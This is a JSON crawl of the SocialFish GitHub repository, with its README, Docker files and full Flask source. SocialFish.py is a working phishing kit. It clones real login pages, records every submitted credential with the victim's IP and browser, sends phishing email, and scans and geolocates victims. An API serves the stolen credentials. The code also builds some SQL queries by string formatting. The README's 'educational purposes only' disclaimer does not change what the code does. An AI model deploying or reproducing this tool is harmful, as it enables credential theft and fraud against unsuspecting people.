{
  "metadata": {
    "timestamp": 1736711529447,
    "page": 15,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjIw",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "UndeadSec/SocialFish",
      "stars": 4192,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".github",
          "type": "tree",
          "content": null
        },
        {
          "name": "CODE_OF_CONDUCT.md",
          "type": "blob",
          "size": 0.2490234375,
          "content": "# Contributor Code of Conduct\n\nThis project adheres to No Code of Conduct. We are all adults. We accept anyone's contributions. Nothing else matters.\n\nFor more information please visit the [No Code of Conduct homepage](https://github.com/domgetter/NCoC).\n"
        },
        {
          "name": "CONTRIBUTING.md",
          "type": "blob",
          "size": 1.8759765625,
          "content": "## How to contribute to SocialFish\n\n#### **Did you find a bug?**\n\n* **Make sure** you have followed the [setup instructions](https://github.com/UndeadSec/SocialFish/wiki/Setting-Up-SocialFish) correctly.\n\n* **Ensure the bug was not already reported** by searching on GitHub under [Issues](https://github.com/UndeadSec/SocialFish/issues).\n\n* If you're unable to find an open issue addressing the problem, [open a new one](https://github.com/UndeadSec/SocialFish/issues/new). Be sure to include a **title and clear description**, as much relevant information as possible, and a **code sample** or an **executable test case** demonstrating the expected behavior that is not occurring.\n\n* If possible, use the relevant bug report templates to create the issue. Simply **fill the info** that each kind of issue template has.\n\n#### **Did you write a patch that fixes a bug?**\n\n* Open a new GitHub pull request with the patch.\n\n* Ensure the PR description clearly describes the problem and solution. Include the relevant issue number if applicable.\n\n#### **Did you fix whitespace, format code, or make a purely cosmetic patch?**\n\nChanges that are cosmetic in nature and do not add anything substantial to the stability, functionality, or testability of SocialFish will generally not be accepted.\n\n#### **Do you intend to add a new feature or change an existing one?**\n\n* Discuss your change with us in our [Telegram channel](https://t.me/UndeadSec) and start writing code.\n\n* Do not open an issue on GitHub until you have collected positive feedback about the change. GitHub issues are primarily intended for bug reports and fixes.\n\n#### **Do you have questions about the source code?**\n\n* Ask any question about how to use SocialFish in the [Telegram channel](https://t.me/UndeadSec).\n\n\nUndeadSec is a volunteer effort. We encourage you to pitch in and [join the team](https://t.me/UndeadSec)!\n\nThanks! :heart: :heart: :heart:\n"
        },
        {
          "name": "Dockerfile",
          "type": "blob",
          "size": 0.833984375,
          "content": "FROM docker.io/python:3.9.16-alpine3.17\n\nRUN sed -i \"s/v3.17/edge/g\" /etc/apk/repositories\nRUN echo \"https://dl-cdn.alpinelinux.org/alpine/edge/testing\" >> /etc/apk/repositories\n\nRUN apk upgrade -U\nRUN apk add --no-cache py3-psutil py3-requests py3-nmap py3-qrcode py3-flask py3-colorama py3-flask-login py3-secretstorage py3-jupyter-packaging\nRUN apk add --no-cache gcc ethtool nmap bash\n\nWORKDIR /usr/src/app\n\nRUN python -m pip install --upgrade pip\nRUN pip install pipenv\nRUN pipenv --python 3\nRUN pipenv install requests\nRUN pipenv install PyLaTeX\nRUN pipenv install python3-nmap\nRUN pipenv install qrcode\nRUN pipenv install Flask\nRUN pipenv install colorama\nRUN pipenv install Flask_Login\nRUN pipenv install python-nmap\n#RUN pipenv install python-secrets\n\nCOPY . .\n\nCMD [ \"pipenv\", \"run\", \"python\", \"SocialFish.py\" ]\n#pipenv run python SocialFish.py"
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 1.474609375,
          "content": "BSD 3-Clause License\n\nCopyright (c) 2018, Undead Sec\nAll rights reserved.\n\nRedistribution and use in source and binary forms, with or without\nmodification, are permitted provided that the following conditions are met:\n\n* Redistributions of source code must retain the above copyright notice, this\n  list of conditions and the following disclaimer.\n\n* Redistributions in binary form must reproduce the above copyright notice,\n  this list of conditions and the following disclaimer in the documentation\n  and/or other materials provided with the distribution.\n\n* Neither the name of the copyright holder nor the names of its\n  contributors may be used to endorse or promote products derived from\n  this software without specific prior written permission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\nAND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\nIMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\nDISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE\nFOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL\nDAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR\nSERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\nCAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,\nOR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\nOF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 2.9072265625,
          "content": "<p align=\"center\">\n  <img src=\"https://raw.githubusercontent.com/UndeadSec/SocialFishMobile/master/content/logo.png\" width=\"200\"/>\n</a></p>\n<h1 align=\"center\">SocialFish</h1>\n\nAre you looking for SF's mobile controller? [UndeadSec/SocialFishMobile][sf-mobile]\n\nAre you looking for SF's old version(**Ngrok integrated**) ? [UndeadSec/SociaFish/.../sharkNet][sf-sharknet]\n\n#### SETUP AND RUNNING\n\nVisit the [wiki](https://github.com/UndeadSec/SocialFish/wiki) for more details.\n\nSetup instructions [here](https://github.com/UndeadSec/SocialFish/wiki/Setting-Up-SocialFish).\n\n![Screenshot](https://raw.githubusercontent.com/UndeadSec/SocialFishMobile/master/content/screen.png)\n\n#### MAINTAINERS\n\n- **Alisson Moretto**, Twitter: [@UndeadSec][tw-alisson], GitHub: [@UndeadSec][git-alisson]\n- **VandrÃ© Augusto**, Twitter: [@dr1nKoRdi3][tw-drink], GitHub: [@dr1nK0Rdi3][git-drink]\n\n#### DOCS\n\n- **Fernando Bellincanta**, Twitter: [@ErvalhouS][tw-fernando], GitHub: [@ErvalhouS][git-fernando]\n\n### DISCLAIMER\n\nTO BE USED FOR EDUCATIONAL PURPOSES ONLY\n\nThe use of the SocialFish is COMPLETE RESPONSIBILITY of the END-USER. Developers assume NO liability and are NOT responsible for any misuse or damage caused by this program.\n\n\"DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE\nFOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL\nDAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR\nSERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\nCAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,\nOR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\nOF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\"\nTaken from [LICENSE](LICENSE).\n\n# Build\n## Docker\n> How to run with Docker?\n\nYou need to run:\n```sh\ndocker compose up\n```\n\n# CONTRIBUTING\n\n[![Open Source Helpers](https://www.codetriage.com/undeadsec/socialfish/badges/users.svg)](https://www.codetriage.com/undeadsec/socialfish)\n\nWe encourage you to contribute to SocialFish! Please check out the [Contributing to SocialFish](https://github.com/UndeadSec/SocialFish/blob/master/CONTRIBUTING.md) guide for guidelines about how to proceed. Join us!\n\n# CONTRIBUTOR CODE OF CONDUCT\n\nThis project adheres to No Code of Conduct. We are all adults. We accept anyone's contributions. Nothing else matters.\n\nFor more information please visit the [No Code of Conduct homepage](https://github.com/domgetter/NCoC).\n\n[//]: # 'links references'\n[tw-alisson]: https://twitter.com/UndeadSec\n[git-alisson]: https://github.com/UndeadSec\n[tw-drink]: https://twitter.com/Dr1nkOrdi3\n[git-drink]: https://github.com/dr1nk0rdi3\n[sf-mobile]: https://github.com/UndeadSec/SocialFishMobile\n[git-tiago]: https://github.com/tiagorlampert\n[git-fernando]: https://github.com/ErvalhouS\n[tw-fernando]: https://twitter.com/ErvalhouS\n[sf-sharknet]: https://github.com/UndeadSec/SocialFish/releases/tag/sharkNet\n"
        },
        {
          "name": "SocialFish.py",
          "type": "blob",
          "size": 18.755859375,
          "content": "#!/usr/bin/env python3\n#\nfrom flask import Flask, request, render_template, jsonify, redirect, g, flash\nfrom core.config import *\nfrom core.view import head\nfrom core.scansf import nScan\nfrom core.clonesf import clone\nfrom core.dbsf import initDB\nfrom core.genToken import genToken, genQRCode\nfrom core.sendMail import sendMail\nfrom core.tracegeoIp import tracegeoIp\nfrom core.cleanFake import cleanFake\nfrom core.genReport import genReport\nfrom core.report import generate_unique #>> new line\nfrom datetime import date\nfrom sys import argv, exit, version_info\nimport colorama\nimport sqlite3\nimport flask_login\nimport os\n\n# Verificar argumentos\nif len(argv) < 2:\n    print(\"./SocialFish <youruser> <yourpassword>\\n\\ni.e.: ./SocialFish.py root pass\")\n    exit(0)\n\n# Temporario\ntry:\n    users = {argv[1]: {'password': argv[2]}}\nexcept IndexError:\n    print(\"./SocialFish <youruser> <yourpassword>\\n\\ni.e.: ./SocialFish.py root pass\")\n    exit(0)\n# Definicoes do flask\napp = Flask(__name__, static_url_path='',\n            static_folder='templates/static')\napp.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0\n\n# Inicia uma conexao com o banco antes de cada requisicao\n@app.before_request\ndef before_request():\n    g.db = sqlite3.connect(DATABASE)\n\n# Finaliza a conexao com o banco apos cada conexao\n@app.teardown_request\ndef teardown_request(exception):\n    if hasattr(g, 'db'):\n        g.db.close()\n\n# Conta o numero de credenciais salvas no banco\ndef countCreds():\n    count = 0\n    cur = g.db\n    select_all_creds = cur.execute(\"SELECT id, url, pdate, browser, bversion, platform, rip FROM creds order by id desc\")\n    for i in select_all_creds:\n        count += 1\n    return count\n\n# Conta o numero de visitantes que nao foram pegos no phishing\ndef countNotPickedUp():\n    count = 0\n\n    cur = g.db\n    select_clicks = cur.execute(\"SELECT clicks FROM socialfish where id = 1\")\n\n    for i in select_clicks:\n        count = i[0]\n\n    count = count - countCreds()\n    return count\n\n#----------------------------------------\n\n# definicoes do flask e de login\napp.secret_key = APP_SECRET_KEY\nlogin_manager = flask_login.LoginManager()\nlogin_manager.init_app(app)\n\nclass User(flask_login.UserMixin):\n    pass\n\n@login_manager.user_loader\ndef user_loader(email):\n    if email not in users:\n        return\n\n    user = User()\n    user.id = email\n    return user\n\n\n@login_manager.request_loader\ndef request_loader(request):\n    email = request.form.get('email')\n    if email not in users:\n        return\n\n    user = User()\n    user.id = email\n    user.is_authenticated = request.form['password'] == users[email]['password']\n\n    return user\n\n# ---------------------------------------------------------------------------------------\n\n# Rota para o caminho de inicializacao, onde e possivel fazer login\n@app.route('/neptune', methods=['GET', 'POST'])\ndef admin():\n    # se a requisicao for get\n    if request.method == 'GET':\n        # se o usuario estiver logado retorna para a pagina de credenciais\n        if flask_login.current_user.is_authenticated:\n            return redirect('/creds')\n        # caso contrario retorna para a pagina de login\n        else:\n            return render_template('signin.html')\n\n    # se a requisicao for post, verifica-se as credencias\n    if request.method == 'POST':\n        email = request.form['email']\n        try:\n            # caso sejam corretas\n            if request.form['password'] == users[email]['password']:\n                user = User()\n                user.id = email\n                # torna autentico\n                flask_login.login_user(user)\n                # retorna acesso a pagina restrita\n                return redirect('/creds')\n            # contrario retorna erro\n            else:\n                # temporario\n                return \"bad\"\n        except:\n            return \"bad\"\n\n# funcao onde e realizada a renderizacao da pagina para a vitima\n@app.route(\"/\")\ndef getLogin():\n    # caso esteja configurada para clonar, faz o download da pagina utilizando o user-agent do visitante\n    if sta == 'clone':\n        agent = request.headers.get('User-Agent').encode('ascii', 'ignore').decode('ascii')\n        clone(url, agent, beef)\n        o = url.replace('://', '-')\n        cur = g.db\n        cur.execute(\"UPDATE socialfish SET clicks = clicks + 1 where id = 1\")\n        g.db.commit()\n        template_path = 'fake/{}/{}/index.html'.format(agent, o)\n        return render_template(template_path)\n    # caso seja a url padrao\n    elif url == 'https://github.com/UndeadSec/SocialFish':\n        return render_template('default.html')\n    # caso seja configurada para custom\n    else:\n        cur = g.db\n        cur.execute(\"UPDATE socialfish SET clicks = clicks + 1 where id = 1\")\n        g.db.commit()\n        return render_template('custom.html')\n\n# funcao onde e realizado o login por cada pagina falsa\n@app.route('/login', methods=['POST'])\ndef postData():\n    if request.method == \"POST\":\n        fields = [k for k in request.form]\n        values = [request.form[k] for k in request.form]\n        data = dict(zip(fields, values))\n        browser = str(request.user_agent.browser)\n        bversion = str(request.user_agent.version)\n        platform = str(request.user_agent.platform)\n        rip = str(request.remote_addr)\n        d = \"{:%m-%d-%Y}\".format(date.today())\n        cur = g.db\n        sql = \"INSERT INTO creds(url,jdoc,pdate,browser,bversion,platform,rip) VALUES(?,?,?,?,?,?,?)\"\n        creds = (url, str(data), d, browser, bversion, platform, rip)\n        cur.execute(sql, creds)\n        g.db.commit()\n    return redirect(red)\n\n# funcao para configuracao do funcionamento CLONE ou CUSTOM, com BEEF ou NAO\n@app.route('/configure', methods=['POST'])\ndef echo():\n    global url, red, sta, beef\n    red = request.form['red']\n    sta = request.form['status']\n    beef = request.form['beef']\n\n    if sta == 'clone':\n        url = request.form['url']\n    else:\n        url = 'Custom'\n\n    if len(url) > 4 and len(red) > 4:\n        if 'http://' not in url and sta != '1' and 'https://' not in url:\n            url = 'http://' + url\n        if 'http://' not in red and 'https://' not in red:\n            red = 'http://' + red\n    else:\n        url = 'https://github.com/UndeadSec/SocialFish'\n        red = 'https://github.com/UndeadSec/SocialFish'\n    cur = g.db\n    cur.execute(\"UPDATE socialfish SET attacks = attacks + 1 where id = 1\")\n    g.db.commit()\n    return redirect('/creds')\n\n# pagina principal do dashboard\n@app.route(\"/creds\")\n@flask_login.login_required\ndef getCreds():\n    cur = g.db\n    attacks = cur.execute(\"SELECT attacks FROM socialfish where id = 1\").fetchone()[0]\n    clicks = cur.execute(\"SELECT clicks FROM socialfish where id = 1\").fetchone()[0]\n    tokenapi = cur.execute(\"SELECT token FROM socialfish where id = 1\").fetchone()[0]\n    data = cur.execute(\"SELECT id, url, pdate, browser, bversion, platform, rip FROM creds order by id desc\").fetchall()\n    return render_template('admin/index.html', data=data, clicks=clicks, countCreds=countCreds, countNotPickedUp=countNotPickedUp, attacks=attacks, tokenapi=tokenapi)\n\n# pagina para envio de emails\n@app.route(\"/mail\", methods=['GET', 'POST'])\n@flask_login.login_required\ndef getMail():\n    if request.method == 'GET':\n        cur = g.db\n        email = cur.execute(\"SELECT email FROM sfmail where id = 1\").fetchone()[0]\n        smtp = cur.execute(\"SELECT smtp FROM sfmail where id = 1\").fetchone()[0]\n        port = cur.execute(\"SELECT port FROM sfmail where id = 1\").fetchone()[0]\n        return render_template('admin/mail.html', email=email, smtp=smtp, port=port)\n    if request.method == 'POST':\n        subject = request.form['subject']\n        email = request.form['email']\n        password = request.form['password']\n        recipient = request.form['recipient']\n        body = request.form['body']\n        smtp = request.form['smtp']\n        port = request.form['port']\n        sendMail(subject, email, password, recipient, body, smtp, port)\n        cur = g.db\n        cur.execute(\"UPDATE sfmail SET email = '{}' where id = 1\".format(email))\n        cur.execute(\"UPDATE sfmail SET smtp = '{}' where id = 1\".format(smtp))\n        cur.execute(\"UPDATE sfmail SET port = '{}' where id = 1\".format(port))\n        g.db.commit()\n        return redirect('/mail')\n\n# Rota para consulta de log\n@app.route(\"/single/<id>\", methods=['GET'])\n@flask_login.login_required\ndef getSingleCred(id):\n    try:\n        sql = \"SELECT jdoc FROM creds where id = {}\".format(id)\n        cur = g.db\n        credInfo = cur.execute(sql).fetchall()\n        if len(credInfo) > 0:\n            return render_template('admin/singlecred.html', credInfo=credInfo)\n        else:\n            return \"Not found\"\n    except:\n        return \"Bad parameter\"\n\n# rota para rastreio de ip\n@app.route(\"/trace/<ip>\", methods=['GET'])\n@flask_login.login_required\ndef getTraceIp(ip):\n    try:\n        traceIp = tracegeoIp(ip)\n        return render_template('admin/traceIp.html', traceIp=traceIp, ip=ip)\n    except:\n        return \"Network Error\"\n\n# rota para scan do nmap\n@app.route(\"/scansf/<ip>\", methods=['GET'])\n@flask_login.login_required\ndef getScanSf(ip):\n    return render_template('admin/scansf.html', nScan=nScan, ip=ip)\n\n# rota post para revogar o token da api\n@app.route(\"/revokeToken\", methods=['POST'])\n@flask_login.login_required\ndef revokeToken():\n    revoke = request.form['revoke']\n    if revoke == 'yes':\n        cur = g.db\n        upsql = \"UPDATE socialfish SET token = '{}' where id = 1\".format(genToken())\n        cur.execute(upsql)\n        g.db.commit()\n        token = cur.execute(\"SELECT token FROM socialfish where id = 1\").fetchone()[0]\n        genQRCode(token, revoked=True)\n    return redirect('/creds')\n\n# pagina para gerar relatorios\n@app.route(\"/report\", methods=['GET', 'POST'])\n@flask_login.login_required\ndef getReport():\n    if request.method == 'GET':\n        cur = g.db\n        urls = cur.execute(\"SELECT DISTINCT url FROM creds\").fetchall()\n        users = cur.execute(\"SELECT name FROM professionals\").fetchall()\n        companies = cur.execute(\"SELECT name FROM companies\").fetchall()\n        uniqueUrls = []\n        for u in urls:\n            if u not in uniqueUrls:\n                uniqueUrls.append(u[0])\n        return render_template('admin/report.html', uniqueUrls=uniqueUrls, users=users, companies=companies)\n    if request.method == 'POST':\n        subject = request.form['subject']\n        user = request.form['selectUser']\n        company = request.form['selectCompany']\n        date_range = request.form['datefilter']\n        target = request.form['selectTarget']\n        _target = 'All' if target=='0' else target\n        genReport(DATABASE, subject, user, company, date_range, _target)\n        generate_unique(DATABASE,_target)\n        return redirect('/report')\n\n# pagina para cadastro de profissionais\n@app.route(\"/professionals\", methods=['GET', 'POST'])\n@flask_login.login_required\ndef getProfessionals():\n    if request.method == 'GET':\n        return render_template('admin/professionals.html')\n    if request.method == 'POST':\n        name = request.form['name']\n        email = request.form['email']\n        obs = request.form['obs']\n        sql = \"INSERT INTO professionals(name,email,obs) VALUES(?,?,?)\"\n        info = (name, email, obs)\n        cur = g.db\n        cur.execute(sql, info)\n        g.db.commit()\n        return redirect('/professionals')\n\n# pagina para cadastro de empresas\n@app.route(\"/companies\", methods=['GET', 'POST'])\n@flask_login.login_required\ndef getCompanies():\n    if request.method == 'GET':\n        return render_template('admin/companies.html')\n    if request.method == 'POST':\n        name = request.form['name']\n        email = request.form['email']\n        phone = request.form['phone']\n        address = request.form['address']\n        site = request.form['site']\n        sql = \"INSERT INTO companies(name,email,phone,address,site) VALUES(?,?,?,?,?)\"\n        info = (name, email, phone, address, site)\n        cur = g.db\n        cur.execute(sql, info)\n        g.db.commit()\n        return redirect('/companies')\n\n# rota para gerenciamento de usuarios\n@app.route(\"/sfusers/\", methods=['GET'])\n@flask_login.login_required\ndef getSfUsers():\n    return render_template('admin/sfusers.html')\n\n#--------------------------------------------------------------------------------------------------------------------------------\n#LOGIN VIEWS\n\n@app.route('/logout')\ndef logout():\n    flask_login.logout_user()\n    return 'Logged out'\n\n@login_manager.unauthorized_handler\ndef unauthorized_handler():\n    return 'Unauthorized'\n\n#--------------------------------------------------------------------------------------------------------------------------------\n# MOBILE API\n\n# VERIFICAR CHAVE\n@app.route(\"/api/checkKey/<key>\", methods=['GET'])\ndef checkKey(key):\n    cur = g.db\n    tokenapi = cur.execute(\"SELECT token FROM socialfish where id = 1\").fetchone()[0]\n    if key == tokenapi:\n        status = {'status':'ok'}\n    else:\n        status = {'status':'bad'}\n    return jsonify(status)\n\n@app.route(\"/api/statistics/<key>\", methods=['GET'])\ndef getStatics(key):\n    cur = g.db\n    tokenapi = cur.execute(\"SELECT token FROM socialfish where id = 1\").fetchone()[0]\n    if key == tokenapi:\n        cur = g.db\n        attacks = cur.execute(\"SELECT attacks FROM socialfish where id = 1\").fetchone()[0]\n        clicks = cur.execute(\"SELECT clicks FROM socialfish where id = 1\").fetchone()[0]\n        countC = countCreds()\n        countNPU = countNotPickedUp()\n        info = {'status':'ok','attacks':attacks, 'clicks':clicks, 'countCreds':countC, 'countNotPickedUp':countNPU}\n    else:\n        info = {'status':'bad'}\n    return jsonify(info)\n\n@app.route(\"/api/getJson/<key>\", methods=['GET'])\ndef getJson(key):\n    cur = g.db\n    tokenapi = cur.execute(\"SELECT token FROM socialfish where id = 1\").fetchone()[0]\n    if key == tokenapi:\n        try:\n            sql = \"SELECT * FROM creds\"\n            cur = g.db\n            credInfo = cur.execute(sql).fetchall()\n            listCreds = []\n            if len(credInfo) > 0:\n                for c in credInfo:\n                    cred = {'id':c[0],'url':c[1], 'post':c[2], 'date':c[3], 'browser':c[4], 'version':c[5],'os':c[6],'ip':c[7]}\n                    listCreds.append(cred)\n            else:\n                credInfo = {'status':'nothing'}\n            return jsonify(listCreds)\n        except:\n            return \"Bad parameter\"\n    else:\n        credInfo = {'status':'bad'}\n        return jsonify(credInfo)\n\n@app.route('/api/configure', methods = ['POST'])\ndef postConfigureApi():\n    global url, red, sta, beef\n    if request.is_json:\n        content = request.get_json()\n        cur = g.db\n        tokenapi = cur.execute(\"SELECT token FROM socialfish where id = 1\").fetchone()[0]\n        if content['key'] == tokenapi:\n            red = content['red']\n            beef = content['beef']\n            if content['sta'] == 'clone':\n                sta = 'clone'\n                url = content['url']\n            else:\n                sta = 'custom'\n                url = 'Custom'\n\n            if url != 'Custom':\n                if len(url) > 4:\n                    if 'http://' not in url and sta != '1' and 'https://' not in url:\n                        url = 'http://' + url\n            if len(red) > 4:\n                if 'http://' not in red and 'https://' not in red:\n                    red = 'http://' + red\n            else:\n                red = 'https://github.com/UndeadSec/SocialFish'\n            cur = g.db\n            cur.execute(\"UPDATE socialfish SET attacks = attacks + 1 where id = 1\")\n            g.db.commit()\n            status = {'status':'ok'}\n        else:\n            status = {'status':'bad'}\n    else:\n        status = {'status':'bad'}\n    return jsonify(status)\n\n@app.route(\"/api/mail\", methods=['POST'])\ndef postSendMail():\n    if request.is_json:\n        content = request.get_json()\n        cur = g.db\n        tokenapi = cur.execute(\"SELECT token FROM socialfish where id = 1\").fetchone()[0]\n        if content['key'] == tokenapi:\n            subject = content['subject']\n            email = content['email']\n            password = content['password']\n            recipient = content['recipient']\n            body = content['body']\n            smtp = content['smtp']\n            port = content['port']\n            if sendMail(subject, email, password, recipient, body, smtp, port) == 'ok':\n                cur = g.db\n                cur.execute(\"UPDATE sfmail SET email = '{}' where id = 1\".format(email))\n                cur.execute(\"UPDATE sfmail SET smtp = '{}' where id = 1\".format(smtp))\n                cur.execute(\"UPDATE sfmail SET port = '{}' where id = 1\".format(port))\n                g.db.commit()\n                status = {'status':'ok'}\n            else:\n                status = {'status':'bad','error':str(sendMail(subject, email, password, recipient, body, smtp, port))}\n        else:\n            status = {'status':'bad'}\n    else:\n        status = {'status':'bad'}\n    return jsonify(status)\n\n@app.route(\"/api/trace/<key>/<ip>\", methods=['GET'])\ndef getTraceIpMob(key, ip):\n    cur = g.db\n    tokenapi = cur.execute(\"SELECT token FROM socialfish where id = 1\").fetchone()[0]\n    if key == tokenapi:\n        try:\n            traceIp = tracegeoIp(ip)\n            return jsonify(traceIp)\n        except:\n            content = {'status':'bad'}\n            return jsonify(content)\n    else:\n        content = {'status':'bad'}\n        return jsonify(content)\n\n@app.route(\"/api/scansf/<key>/<ip>\", methods=['GET'])\ndef getScanSfMob(key, ip):\n    cur = g.db\n    tokenapi = cur.execute(\"SELECT token FROM socialfish where id = 1\").fetchone()[0]\n    if key == tokenapi:\n        return jsonify(nScan(ip))\n    else:\n        content = {'status':'bad'}\n        return jsonify(content)\n\n@app.route(\"/api/infoReport/<key>\", methods=['GET'])\ndef getReportMob(key):\n    cur = g.db\n    tokenapi = cur.execute(\"SELECT token FROM socialfish where id = 1\").fetchone()[0]\n    if key == tokenapi:\n        urls = cur.execute(\"SELECT url FROM creds\").fetchall()\n        users = cur.execute(\"SELECT name FROM professionals\").fetchall()\n        comp = cur.execute(\"SELECT name FROM companies\").fetchall()\n        uniqueUrls = []\n        professionals = []\n        companies = []\n        for c in comp:\n            companies.append(c[0])\n        for p in users:\n            professionals.append(p[0])\n        for u in urls:\n            if u not in uniqueUrls:\n                uniqueUrls.append(u[0])\n        info = {'urls':uniqueUrls,'professionals':professionals, 'companies':companies}\n        return jsonify(info)\n    else:\n        return jsonify({'status':'bad'})\n\n#--------------------------------------------------------------------------------------------------------------------------------\ndef main():\n        if version_info<(3,0,0):\n            print('[!] Please use Python 3. $ python3 SocialFish.py')\n            exit(0)\n        head()\n        cleanFake()\n        # Inicia o banco\n        initDB(DATABASE)\n        app.run(host=\"0.0.0.0\", port=5000)\n\nif __name__ == \"__main__\":\n    try:\n        main()\n    except KeyboardInterrupt:\n        exit(0)\n"
        },
        {
          "name": "__init__.py",
          "type": "blob",
          "size": 0,
          "content": ""
        },
        {
          "name": "core",
          "type": "tree",
          "content": null
        },
        {
          "name": "docker-compose.yml",
          "type": "blob",
          "size": 0.36328125,
          "content": "version: '3.9'\n\nx-logging: &default-logging\n  options:\n    max-size: \"40m\"\n    max-file: \"10\"\n  driver: json-file\n\nservices:\n  social-fish:\n    container_name: social-fish\n    build:\n      context: .\n      dockerfile: Dockerfile\n    ports:\n      - \"5000:5000\"\n    # Username is: user\n    # Password is: password\n    command: \"pipenv run python SocialFish.py user password\""
        },
        {
          "name": "images",
          "type": "tree",
          "content": null
        },
        {
          "name": "requirements.txt",
          "type": "blob",
          "size": 0.0888671875,
          "content": "requests\nPyLaTeX\npython3-nmap\nqrcode\nFlask\ncolorama\nFlask_Login\npython-nmap\npython-secrets\n"
        },
        {
          "name": "templates",
          "type": "tree",
          "content": null
        }
      ]
    }
  ]
}